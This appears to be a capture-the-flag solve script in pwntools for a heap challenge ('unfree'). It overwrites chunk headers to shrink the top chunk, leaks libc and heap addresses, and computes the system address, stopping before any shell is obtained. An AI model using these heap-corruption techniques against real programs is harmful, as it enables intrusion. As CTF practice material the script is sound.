from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./unfree_patched")
libc = ELF("./libc.so.6")
one_gadget = [0x583dc, 0x583e3, 0xef4ce, 0xef52b]
libc.sym.one_gadget = one_gadget[1]

#libc.sym.main_arena = libc.sym.__madlloc_hook + 0x10

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)


def cr(index, size, data):

    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"1")

    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()

    io.sendline(str(size).encode())
    io.recvline()

    io.send(data)

def edit(index, data):
    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"2")

    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()

    io.send(data)

def view(index):

    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"3")

    io.recvline()
    io.sendline(str(index).encode())

    return io.recvline()
        
def extract_address(leak):
    return u64(leak.strip().ljust(8, b"\x00"))

context.terminal = ['gnome-terminal', '-e']
context.arch = "amd64"
io = start()

cr(0, 0x10, b"test")
edit(0, b'test'.ljust(0x10) + flat(0, 0xd51))
cr(1, 0xe00+0x180, b"\x00"*0xe00 + b'test') # 2
cr(2, 0xd20, b"\x01")

leak_address = extract_address(view(2).strip())

print(f"Leak Libc Address {hex(leak_address)}")

libc.address = (leak_address - 65) - libc.sym.main_arena
print(f"System Address {hex(libc.sym.system)}")

edit(1, b'A'*0xf80 + flat(0, 0x71))
cr(3, 0xff0 - 0x70, b'test')
edit(3, b'A'.ljust(0xff0 - 0x70) + flat(0, 0x71))
cr(4, 0xff0 - 0x70, b'test')
edit(1, b'A'*(0xff0 - 0x70 + 0x10))
leak_heap_address = u64(view(1)[0xf90::].strip().ljust(8, b"\x00"))

leak_heap_address = (leak_heap_address << 12) - 0x21000

print(f"Leak Heap Address: {hex(leak_heap_address)}")
io.interactive()
